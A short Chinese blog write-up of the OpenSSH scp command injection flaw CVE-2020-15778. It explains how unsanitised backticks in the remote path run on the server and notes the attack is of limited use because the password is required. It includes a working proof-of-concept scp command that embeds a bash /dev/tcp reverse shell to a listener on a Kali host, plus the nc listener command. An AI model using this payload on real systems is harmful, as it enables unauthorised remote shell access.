# OpenSSH 的 scp 命令注入漏洞(CVE-2020-15778) - zw1sh - 博客园

> 原文：[`www.cnblogs.com/zw1sh/p/13823190.html`](https://www.cnblogs.com/zw1sh/p/13823190.html)

# OpenSSH 的 scp 命令注入漏洞(CVE-2020-15778)

影响版本：OpenSSH =< 8.3p1

scp 是 secure copy 的缩写。在 linux 系统中，scp 用于 linux 之间复制文件和目录，基于 ssh 登陆进行安全的远程文件拷贝命令。该命令由 openssh 的 scp.c 及其他相关代码实现。

poc 利用：
在向远程主机拷贝文件时，文件的路径会追加到本地 scp 命令后，当执行本地 scp 命令时，scp 不会检查、过滤和清除文件名。这使得攻击者执行带有反引号的有效 scp 命令时，本地 shell 还将执行反引号中的命令。

```
查看 OpenSSH 的版本
ssh -V

反弹 shell：
kali：192.168.1.111
openssh 主机：192.168.1.194

scp zwish.php root@192.168.1.194:'`bash -i >& /dev/tcp/192.168.1.111/4444 0>&1`'

kali 监听：nc -lvp 4444 
```

比较鸡肋的是需要知道登录的 ssh 用户的密码。
这里尝试禁止某个 ssh 用户远程登录，但他必须经过密码的身份验证才能反弹 shell，所以可利用的场景实在是想不到
1、网上搜资料说可以在 authorized_key 文件可以设置允许 SCP 单不允许 SSH 实际登陆
2、可能会用在回弹 shell